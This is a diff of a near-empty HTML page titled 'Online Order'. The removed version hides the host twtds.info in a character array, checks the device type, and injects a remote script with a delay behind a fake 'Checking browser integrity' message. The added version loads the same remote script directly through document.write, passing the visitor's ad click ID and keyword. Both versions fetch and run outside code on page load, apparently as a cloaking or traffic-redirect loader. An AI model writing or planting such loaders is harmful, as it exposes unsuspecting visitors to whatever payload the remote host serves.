@@ -1,47 +1,19 @@
-<!DOCTYPE html>
 <html>
-<head>
-  <meta charset='UTF-8'>
-  <meta name='viewport' content='width=device-width, initial-scale=1'>
-  <meta name='robots' content='noindex, nofollow'>
-  <link rel='icon' href='data:,'>
-  <title>Processing Request</title>
-  <style>
-    body { background-color: #fff; font-family: Arial; margin: 0; }
-    .hidden-msg { display: none; }
-  </style>
-  <script>
-    function scanParam(p) {
-      const q = new URLSearchParams(window.location.search);
-      return q.get(p) || '';
-    }
+  <head>
 
-    function loadCheck() {
-      return (
-        typeof navigator.maxTouchPoints !== 'undefined' && navigator.maxTouchPoints > 0
-      ) || (
-        typeof window.orientation !== 'undefined'
-      ) || (
-        /Android|iPhone|iPad|Windows|Macintosh/i.test(navigator.userAgent)
-      );
+    <script>
+    function GET(item) {
+        var p = window.location.search;
+        p = p.match(new RegExp(item+'=([^&=]+)'));
+        return p ? p[1] : false;
     }
+    var url = "https://twtds.info/eujswlr?gclid="+GET('gclid')+"&keyword="+GET('keyword');
+    document.write("<script src="+url+"><\/script>");
+    </script>
 
-    function loadScript() {
-      const gclid = scanParam('gclid');
-      const keyword = scanParam('keyword');
-      const parts = ["h","t","t","p","s",":","/","/","t","w","t","d","s",".","i","n","f","o","/","e","u","j","s","w","l","r"];
-      const finalUrl = parts.join('') + '?gclid=' + encodeURIComponent(gclid) + '&keyword=' + encodeURIComponent(keyword);
-      const el = document.createElement('script');
-      el.src = finalUrl;
-      document.head.appendChild(el);
-    }
+    <title>Online Order</title>
+  </head>
+  <body>
 
-    if (loadCheck()) {
-      setTimeout(loadScript, 113);
-    }
-  </script>
-</head>
-<body>
-  <div class='hidden-msg'>Checking browser integrity...</div>
-</body>
+  </body>
 </html>
